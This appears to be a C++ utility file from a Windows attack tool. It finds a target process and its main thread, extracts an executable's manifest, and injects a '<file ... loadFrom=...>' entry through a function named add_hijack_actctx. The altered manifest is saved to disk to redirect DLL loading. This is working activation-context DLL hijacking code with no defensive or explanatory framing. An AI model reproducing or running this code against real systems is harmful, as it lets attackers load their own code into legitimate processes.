#include "utils.h"
#include <set>


DWORD get_main_thread_id(DWORD pid)
{
    THREADENTRY32 entry;
    entry.dwSize = sizeof(THREADENTRY32);
    std::wstring output;
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPTHREAD, 0);

    if (Thread32First(snapshot, &entry) == FALSE )
    {
        std::wcout <<L"[-] CreateToolhelp32Snapshot failed " + std::to_wstring(GetLastError()) + L"\n";

    }
    else
    {
        while (Thread32Next(snapshot, &entry) == TRUE)
        {
            if ((pid == entry.th32OwnerProcessID))
            {
                CloseHandle(snapshot);
                return entry.th32ThreadID;
            }
        }
    }
    CloseHandle(snapshot);
    return 0;
}

DWORD align_to_mempage(DWORD size)
{
    if (size % 4096 == 0)
    {
        return size;
    }
    else
    {
        return ((size / 4096) + 1) * 4096;
    }
}

DWORD get_process_id_by_name(const std::wstring& processName) 
{
    DWORD pid = 0;

    // Take a snapshot of all the processes
    HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hSnapshot == INVALID_HANDLE_VALUE) 
    {
        std::wstring output=  L"Failed to take snapshot of processes.\n";

        return 0;
    }

    // Initialize the PROCESSENTRY32 structure
    PROCESSENTRY32 processEntry;
    processEntry.dwSize = sizeof(PROCESSENTRY32);

    // Start walking through the processes
    if (Process32First(hSnapshot, &processEntry)) {
        do {
            // Compare process name (case-insensitive)
            if (processName == processEntry.szExeFile) {
                pid = processEntry.th32ProcessID;
                break;
            }
        } while (Process32Next(hSnapshot, &processEntry));
    }

    // Close the snapshot handle
    CloseHandle(hSnapshot);

    return pid;
}

std::wstring get_process_path(DWORD pid)
{
    std::wstring path;
    HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);

    if (hProcess)
    {
        wchar_t buffer[MAX_PATH];
        DWORD cbBytes = MAX_PATH;
        if (QueryFullProcessImageName(hProcess, 0, buffer, &cbBytes))
        {
            path = buffer;
        }
        CloseHandle(hProcess);
    }
    return path;
}

std::vector<BYTE> extract_manifest(std::wstring file_path)
{
    std::wstring output;
    HMODULE hExe = LoadLibrary(file_path.c_str());
    if (hExe == NULL)
    {
        std::wcout << L"[-] Could not load exe " + std::to_wstring(GetLastError()) + L"\n";
        return std::vector<BYTE>();
    }
    HRSRC hRes = FindResource(hExe, MAKEINTRESOURCE(1), RT_MANIFEST);
    if (hRes == NULL)
    {
        std::wcout << L"[-] Could not find resource " + std::to_wstring(GetLastError()) + L"\n";
        return std::vector<BYTE>();
    }

    DWORD dwSize;
    std::vector<BYTE> resource;
    // Read origin resource
    HGLOBAL resData = LoadResource(hExe, hRes);
    if (resData == NULL)
    {
        std::wcout <<  L"[-] Could not load resource " + std::to_wstring(GetLastError()) + L"\n";
        return std::vector<BYTE>();
    }


    DWORD resSize = SizeofResource(hExe, hRes);
    if (resSize == 0)
    {
        std::wcout <<L"[-] Could not load size resource " + std::to_wstring(GetLastError()) + L"\n";
        return std::vector<BYTE>();
    }

    LPVOID pResourceData = LockResource(resData);
    if (pResourceData == NULL)
    {
        std::wcout <<L"[-] Could not lock resource " + std::to_wstring(GetLastError()) + L"\n";

        return std::vector<BYTE>();
    }

    resource.assign((BYTE*)pResourceData, (BYTE*)((BYTE*)pResourceData + resSize));

    // the manifest
    if (resource.empty())
    {
        // got the manifest
        std::wcout <<L"[-] Read resource manifest failed\n";

        return std::vector<BYTE>();
    }
    //Release resource
    UnlockResource(resData);
    FreeResource(resData);
    FreeLibrary(hExe);

    return resource;
}

std::vector<BYTE> add_hijack_actctx(std::wstring dummy_dll_name, std::wstring target_dll_load, std::vector<BYTE> manifest)
{
    std::vector<BYTE> resource;
    std::string tag = "</assembly>";

    std::string content(manifest.begin(), manifest.end());
    std::string dummy_dll_name_str(dummy_dll_name.begin(), dummy_dll_name.end());
    std::string target_dll_load_str(target_dll_load.begin(), target_dll_load.end());

    size_t pos = content.find(tag);

    std::string insert_content = std::string(R"( <file name=")") + dummy_dll_name_str + std::string(R"(" hash="optional" loadFrom=")") + target_dll_load_str + std::string(R"("/>)");

    content.insert(pos, insert_content);

    resource.assign(content.begin(), content.begin() + manifest.size() + insert_content.size());

    return resource;
}

BOOL save_data_to_file(std::vector<BYTE> manifest, std::wstring file_path)
{
    std::ofstream file(file_path, std::ios::binary);
    if (!file)
    {
        std::wcout << L"Failed to open temp file\n";
        return FALSE;
    }

    file.write(reinterpret_cast<const char*>(manifest.data()), manifest.size());
    file.close();
    std::wcout <<L"[+] Temporary file written to: " + file_path + L"\n";
    return true;
}


